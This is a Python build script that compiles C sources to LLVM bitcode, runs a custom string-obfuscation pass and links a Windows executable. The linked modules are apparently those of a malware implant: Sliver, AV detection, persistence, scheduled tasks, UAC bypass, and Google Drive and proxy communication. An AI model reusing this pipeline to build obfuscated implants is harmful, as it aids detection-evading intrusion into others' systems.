import subprocess
import os

clang_args = ["clang", "-O0", "-emit-llvm", "-c", "Test\\main.c", "-I", "D:\\Documents\\Github\\systeminformer-master\\phnt\\include", "-I", ".\\Utils", "-I", ".\\Communication", "-disable-O0-optnone", "-o", ".\\build\\main.bc"]
opt_args = ['opt', '--load-pass-plugin=D:\\Temp\\vs-windows-llvm\\build\\lib\\Debug\\vs-windows-llvm.dll', '--passes=my-obf-str', '.\\build\\main.bc']
llc_args = ['llc', '-filetype=obj', '-O0', '.\\build\\obfuscated-build\\main.bc']
pdb_path = os.getcwd() + "\\main.pdb"
lld_args = ['lld-link', '/debug', '/SUBSYSTEM:CONSOLE', '/machine:X64', '/dynamicbase:no', '/incremental:no', '/libpath:"C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.22621.0\\um\\x64\\"', '/out:.\\bin\\main.exe', 'main.obj', 'Sliver.obj', 'Handler.obj', 'sspi.obj', 'Utils.lib', 'Communication.lib']
libs = ['user32.lib', 'kernel32.lib', 'shell32.lib', 'Version.lib', 'iphlpapi.lib', 'oleaut32.lib', 'msvcrt.lib', 'comdlg32.lib', 'dbghelp.lib', 'Ole32.lib', 'ws2_32.lib', 'crypt32.lib', 'taskschd.lib', 'wbemuuid.lib', 'bcrypt.lib', 'ntdll.lib', 'winhttp.lib', 'ShLwApi.lib', 'strsafe.lib', 'wininet.lib', 'advapi32.lib', 'wtsapi32.lib']
targeted_dir = ['Test', 'Utils', 'Communication']

def print_list(l: list):
    print('Run: ', end='')
    for i in l:
        print(i + ' ', end='')

    print('')

for dir in targeted_dir:
    for file in os.listdir(dir):
        if file.endswith(".c"):
            name = file.split(".")[0]
            clang_args[4] = dir + "\\" + file
            clang_args[-1] = f"build\\{name}.bc"
            opt_args[-1] = clang_args[-1]
            llc_args[-1] = f'.\\build\\obfuscated-build\\{name}.bc'
            print_list(clang_args)
            subprocess.run(clang_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print_list(opt_args)
            result = subprocess.run(opt_args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            open(llc_args[-1], 'wb').write(result.stdout)
            subprocess.run(llc_args)

os.chdir('.\\build\\obfuscated-build')
utils_lib = ['Utils.obj', 'LLVM.obj', 'AVDetection.obj', 'Cryptography.obj', 'Curve25519.obj', 'EventSink.obj', 'Filesystem.obj', 'Gui.obj', 'Hash.obj', 'Image.obj', 'Persistence.obj', 'Process.obj', 'Protobuf.obj', 'Random.obj', 'Registry.obj', 'ScheduledTask.obj', 'Service.obj', 'StringHelper.obj', 'SystemInfo.obj', 'Time.obj', 'UACBypass.obj', 'Wmi.obj']
communication_lib = ['Communication.obj', 'Envelope.obj', 'GoogleDrive.obj', 'Http.obj', 'Proxy.obj', 'URI.obj']
subprocess.run(['llvm-lib'] + utils_lib)
subprocess.run(['llvm-lib'] + communication_lib)
print_list(lld_args + libs)
subprocess.run(lld_args + libs)